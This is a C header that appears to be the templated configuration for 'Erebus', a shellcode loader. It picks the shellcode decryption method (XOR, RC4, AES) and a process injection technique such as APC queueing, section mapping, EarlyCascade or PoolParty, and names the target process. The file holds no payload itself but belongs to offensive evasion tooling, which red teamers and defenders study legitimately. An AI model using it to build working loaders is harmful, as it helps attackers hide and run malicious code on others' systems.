#ifndef EREBUS_CONFIG
#define EREBUS_CONFIG
#pragma once

// ============================================
// ENCRYPTION CONFIGURATION
// ============================================

// Encryption method used for shellcode:
// 0 = NONE        - No decryption
// 1 = XOR         - Simple XOR cipher
// 2 = RC4         - RC4 stream cipher
// 3 = AES_ECB     - AES in ECB mode
// 4 = AES_CBC     - AES in CBC mode
#define CONFIG_ENCRYPTION_TYPE {{ ENCRYPTION_TYPE }}

// Encryption key (define as needed)
// Note: Key size depends on encryption type:
// - XOR: any size (repeating key)
// - RC4: 1-256 bytes
// - AES: 16, 24, or 32 bytes (128, 192, 256 bits)
#define CONFIG_ENCRYPTION_KEY { {{ ENCRYPTION_KEY }} }

// For AES_CBC mode, define the IV (must be 16 bytes)
#define CONFIG_ENCRYPTION_IV { {{ ENCRYPTION_IV }} }

// ============================================
// INJECTION CONFIGURATION
// ============================================

// Target process for remote injection
#define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}\0"

// Injection technique:
// 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
// 2 = NtMapViewOfSection  - Section mapping injection (Remote)
// 3 = CreateFiber         - Fiber-based execution (Self)
// 4 = EarlyCascade        - Early Bird APC injection (Remote)
// 5 = PoolParty           - Worker Factory thread pool injection (Remote)
#define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}

#if CONFIG_INJECTION_TYPE == 3
#define CONFIG_INJECTION_MODE 2  // Self injection
#else
#define CONFIG_INJECTION_MODE 1  // Remote injection
#endif

#if CONFIG_INJECTION_TYPE == 1
#define ExecuteShellcode erebus::InjectionNtQueueApcThread
#elif CONFIG_INJECTION_TYPE == 2
#define ExecuteShellcode erebus::InjectionNtMapViewOfSection
#elif CONFIG_INJECTION_TYPE == 3
#define ExecuteShellcode erebus::InjectionCreateFiber
#elif CONFIG_INJECTION_TYPE == 4
#define ExecuteShellcode erebus::InjectionEarlyCascade
#elif CONFIG_INJECTION_TYPE == 5
#define ExecuteShellcode erebus::InjectionPoolParty
#endif

#endif
